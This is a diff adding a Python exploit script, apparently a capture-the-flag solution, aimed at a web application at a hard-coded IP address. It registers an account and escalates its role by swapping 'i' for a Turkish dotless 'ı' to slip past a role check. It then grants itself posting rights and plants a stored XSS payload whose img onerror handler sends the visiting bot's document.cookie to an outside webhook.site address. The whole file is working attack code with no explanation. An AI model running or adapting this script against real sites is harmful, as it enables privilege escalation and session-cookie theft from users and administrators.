@@ -1,0 +1,58 @@
+import requests
+import string
+URL = "http://3.35.104.112:3000"
+x = requests.Session()
+
+def register(password="testing"):
+    res = x.post(URL +"/auth/register", data={"password":password})
+    username = res.json().get("uuid")
+    print(f"[X] User registered: {username}")
+    return username
+
+def login(uuid):
+    res = x.post(URL + "/auth/login", data={"uuid":uuid,"password":"testing"})
+    cookie = res.json().get('token')
+    print(f"[X] Logged in! {cookie}")
+    x.cookies.set("jwt", cookie)
+
+def escalate_role(role):
+    role = role.replace("i","ı")
+    res = x.post(URL + "/user/role", data={"role":role})
+    cookie = res.json().get('token')
+    print(f"[X] Escalated role to {role}: {cookie}")
+    x.cookies.set("jwt", cookie)
+
+def set_perm(uuid):
+    res = x.post(URL + "/admin/user/perm", json={"uuid":uuid, "value":True})
+    print(f"[X] Changing post permission to true for {uuid}")
+    login(uuid) # Relogin after setting post perms to true
+
+def write_xss(payload):
+    data = {
+        "title":"XSS BY TAN",
+        "content":payload
+    }
+    res = x.post(URL + "/post/write", json=data)
+    if res.json().get('message') == "Hacking Detected!":
+        print("HACKING DETECTED")
+        exit()
+    id = res.json().get('post').get('post_id')
+    print(f"[X] Payload written to post id: {id}")
+    print(f"==> content: {res.json().get('post').get('content')}")
+    return id
+
+def report_post(id):
+    escalate_role("inspector")
+    res = x.get(URL + f"/report/{id}")
+    print(res.text)
+
+def to_html_entities(text):
+    return ''.join(f'&#{ord(c)};' for c in text)
+
+if __name__ == "__main__":
+    uuid = register()
+    login(uuid)
+    escalate_role("admin") # inspector, admin
+    set_perm(uuid)
+    post_id = write_xss(F"""<meta/http-equiv="refresh"/content="0; url=/admin/test/?title=a&content=%3Cimg%20src=x%20onerror=window.location=`https://webhook.site/cd9e81c1-e394-4cc4-9d50-b388fee3201e?${{document.cookie}}`%3E">   """)
+    report_post(post_id)
